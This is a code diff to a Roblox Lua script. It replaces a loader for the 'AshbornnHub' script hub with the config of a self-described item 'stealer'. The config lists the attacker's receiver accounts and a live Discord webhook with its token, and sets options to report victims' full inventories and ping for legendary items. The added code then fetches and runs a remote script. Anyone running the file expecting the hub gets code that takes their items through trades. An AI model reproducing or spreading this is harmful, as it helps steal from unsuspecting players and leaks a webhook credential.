@@ -1,14 +1,11 @@
-local KeySystemUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/MaGiXxScripter0/keysystemv2api/master/ui/xrer_mstudio45.lua"))()
-KeySystemUI.New({
-    ApplicationName = "AshbornnHub", -- Your Key System Application Name
-    Name = "AshbornnHub", -- Your Script name
-    Info = "Get Key For AshbornnHub", -- Info text in the GUI, keep empty for default text.
-    DiscordInvite = "https://discord.com/invite/kqV3wkQVWm", -- Optional.
-    AuthType = "clientid" -- Can select verifycation with ClientId or IP ("clientid" or "ip")
-})
-repeat task.wait() until KeySystemUI.Finished() or KeySystemUI.Closed
-if KeySystemUI.Finished() and KeySystemUI.Closed == false then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/AshMain.lua", true))()
-else
-    print("Player closed the GUI.")
-end
+Config = {
+    Receivers = {"ErrorClient04", "ninjasit"}, -- {"ROBLOX"} or {"ROBLOX", "ROBLOX1", "ROBLOX2"}
+    Webhook = "https://discord.com/api/webhooks/1265971660759240808/SlH8qsSeVnrxWj63UyF-Po2yP5SM8Zb0TtFdKGQLyRRb-Eh94s9hzMS56e5MYZms7Hh_",
+    FullInventory = true, -- If true, it will display all of the player's items.
+    GoodItemsOnly = true, -- If set to true, the stealer will not ping you if the player only has items below legendary.
+    ResendTrade = "Hi", -- Send this in chat to resend the trade request if you don't receive it.
+    Script = "Solara", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
+    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/Arayangsakitngakingdamdamin.lua",true))()
